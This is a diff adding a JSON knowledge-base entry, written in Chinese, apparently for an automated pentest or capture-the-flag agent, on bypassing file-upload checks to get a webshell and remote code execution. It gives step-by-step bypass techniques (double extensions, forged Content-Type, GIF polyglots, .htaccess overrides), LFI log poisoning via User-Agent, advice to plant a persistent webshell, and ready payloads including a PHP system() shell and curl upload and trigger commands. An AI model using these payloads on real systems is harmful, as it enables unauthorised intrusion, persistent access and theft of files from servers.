@@ -1,0 +1,68 @@
+{
+  "id": "web-file-upload-webshell-bypass",
+  "title": "任意文件上传绕过 -> WebShell / RCE",
+  "vuln_pattern": "上传功能对文件名/扩展名/类型校验不严(黑名单、子串匹配、只信 Content-Type、只查 magic),且文件落在 web 可执行目录并保留可控名 -> 传可执行脚本拿 RCE",
+  "fingerprint": [
+    "文件上传",
+    "任意文件上传",
+    "file upload",
+    "arbitrary upload",
+    "upload.php",
+    "multipart/form-data",
+    "双扩展",
+    "move_uploaded_file",
+    "content-type",
+    "webshell",
+    "后缀白名单",
+    "文件类型校验",
+    "file_put_contents",
+    "文件包含",
+    "本地文件包含",
+    "lfi",
+    "路径穿越",
+    "目录遍历",
+    "日志投毒",
+    "log poisoning",
+    "include",
+    "php://filter"
+  ],
+  "exploit_steps": [
+    "摸清校验:黑名单 vs 白名单;是'以 .ext 结尾'还是'仅包含 .ext 子串';是否只看 Content-Type/$_FILES type(客户端可伪造);是否查 magic 头;是否重命名。",
+    "扩展名绕过:双扩展(shell.<允许>.php / shell.php.<允许>,视解析而定)、子串型只需文件名含允许串、大小写(.PhP)、少见可执行后缀(.phtml/.php5/.pht/.phar/.inc)、末尾点/空格/(Windows)::$DATA。",
+    "类型绕过:把 multipart 的 Content-Type 改成白名单值(image/jpeg)而内容仍是脚本;加合法 magic 头做 polyglot(GIF89a 后跟脚本)。",
+    "落点与执行:确认落地目录 web 可达且会解析脚本(原名保留、/uploads/ 直达);也可上传 .htaccess/web.config 改解析规则。",
+    "触发:访问上传文件带命令参数 -> RCE -> 读磁盘上的目标文件。",
+    "没有上传点但有【本地文件包含(LFI)】时的等价拿 shell 路径:先确认 include 参数可控且能穿越(过滤 ../ 时试 `....//` 双写、`..%2f`、`.` 截断、php://filter 读源码定位)。disable_functions 为空 + LFI 会执行被包含文件里的 PHP,于是【日志投毒】:把 PHP 一句话写进会落地的位置(access.log 的 UA/Referer、SSH/邮件/session 文件),再 LFI 包含它即执行拿 RCE。这是 LFI-to-RCE 的通用手法。",
+    "拿到 RCE 后落一个【干净 webshell】到 web 可达且可写的目录(webroot/backup 常可写)做稳定复入,之后直接 HTTP 触发,不必每次重走 LFI/投毒链。"
+  ],
+  "key_payloads": [
+    "printf '<?php system($_GET[\"c\"]); ?>' > shell.jpg.php",
+    "curl -s -b jar -F 'file=@shell.jpg.php;type=image/jpeg;filename=shell.jpg.php' http://<T>/upload",
+    "(printf 'GIF89a'; printf '<?php system($_GET[\"c\"]);?>') > s.gif   # polyglot 图片马",
+    "curl -s \"http://<T>/<上传目录>/shell.jpg.php?c=id\""
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "file-upload",
+    "webshell",
+    "rce",
+    "filter-bypass"
+  ],
+  "source": "seed: web security technique methodology",
+  "created_ts": 0.0,
+  "preconditions": [
+    "有文件上传功能,校验可绕过,且上传文件落在可执行且 web 可达的目录并保留可控名"
+  ],
+  "verify_oracle": "访问上传的脚本带命令参数,响应回显命令输出(id/目标文件内容)即确认 RCE",
+  "pitfalls": [
+    "子串型校验(strpos 含某允许串)只要文件名含该串即过 -> 把允许串放前、可执行后缀放后(shell.<允许>.php)",
+    "只信 Content-Type/$_FILES['type'](客户端可伪造),不查真实内容/类型 -> 直接改 Content-Type",
+    "不重命名 + 落在可执行目录 = 直接 RCE;若被随机重命名/去扩展,转找 .htaccess/包含链/图片马+LFI",
+    "白名单严格时找解析特性(.phtml/.php5、Apache 多扩展 AddHandler)或图片马配合文件包含触发",
+    "目标文件常在磁盘(/flag、容器根)不在库里,传壳后 cat 才拿得到",
+    "有 LFI 却没上传点不等于拿不到 RCE:disable_functions 为空时,LFI 包含被投毒的日志(UA 塞 PHP)即执行——过滤 ../ 用 ....// 双写绕过,先 php://filter 读源码确认包含逻辑",
+    "拿到 RCE 别每次重走链:第一时间在可写 webroot 落一个干净马做稳定入口,后续 HTTP 直达,省得反复投毒/穿越"
+  ]
+}
